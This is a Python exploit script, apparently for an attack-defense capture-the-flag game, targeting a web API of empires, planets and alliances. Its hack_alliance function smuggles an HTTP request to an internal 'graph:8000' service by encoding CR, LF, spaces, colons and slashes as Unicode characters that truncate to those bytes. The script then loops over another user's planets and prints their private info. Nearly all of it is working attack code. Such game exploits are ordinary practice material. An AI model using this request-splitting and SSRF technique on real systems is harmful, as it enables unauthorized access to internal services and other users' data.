import requests
import sys
from checklib import *

ip = sys.argv[1]
hint = sys.argv[2]
urlg = f"http://{ip}:6666/api"

def register(s, u, p):
    url = f'{urlg}/register/'

    r = s.post(url, json={
        'username': u,
        'password': p
    })

def login(s, u, p):
    url = f'{urlg}/login/'

    r = s.post(url, json={
        'username': u,
        'password': p
    })

def create_empire(s, name):
    url = f'{urlg}/empire/create/'

    r = s.post(url, json={
        "name": name
    })

    return r.json()["ok"]

def create_planet(s, name, info, graph):
    url = f'{urlg}/planet/create/'

    r = s.post(url, json={
        "name": name,
        "info": info,
        "graph": graph
    })

    return r.json()["ok"]

def create_alliance(s, l, r):
    url = f'{urlg}/alliance/create/'

    r = s.post(url, json={
        "l": l,
        "r": r,
    })

    return r.json()["ok"]

def get_users(s):
    url = f'{urlg}/user/list/'

    r = s.get(url)

    return r.json()["ok"]

def get_user_empires(s, uid):
    url = f'{urlg}/user/{uid}/empires/'

    r = s.get(url)

    return r.json()["ok"]

def get_empire(s, eid):
    url = f'{urlg}/empire/{eid}/'

    r = s.get(url)

    return r.json()["ok"]

def hack_alliance(s, pid, l, r):
    url = f'{urlg}/alliance/create/'

    payload = ""
    payload += "1337 HTTP/1.1\r\nHost: graph:8000\r\n\r\n"
    payload += f"GET /api/link/{l}/{r}"

    dct = {
        ' ': '\u0120',
        ':': '\u013a',
        '\r': '\u010d',
        '\n': '\u010a',
        '/': '\u012f',
    }

    for i in dct:
        payload = payload.replace(i, dct[i])

    r = s.post(url, json={
        "l": pid,
        "r": payload,
    })

def get_planet(s, pid):
    url = f'{urlg}/planet/{pid}/'
    r = s.get(url)

    return r.json()["ok"]["info"]

u, p = rnd_username(), rnd_password()
s = get_initialized_session()
register(s, u, p)
login(s, u, p)

uid_attack = hint

for eid_attack in get_user_empires(s, uid_attack):
    e_attack = get_empire(s, eid_attack)
    for pid_attack in e_attack['nodes']:
        ename = rnd_string(10)
        eid = create_empire(s, ename)

        pname = rnd_string(10)
        pinfo = rnd_string(10)
        pid = create_planet(s, pname, pinfo, eid)

        create_alliance(s, pid, pid_attack)
        hack_alliance(s, pid, pid_attack, pid)

        print(get_planet(s, pid_attack), flush=True)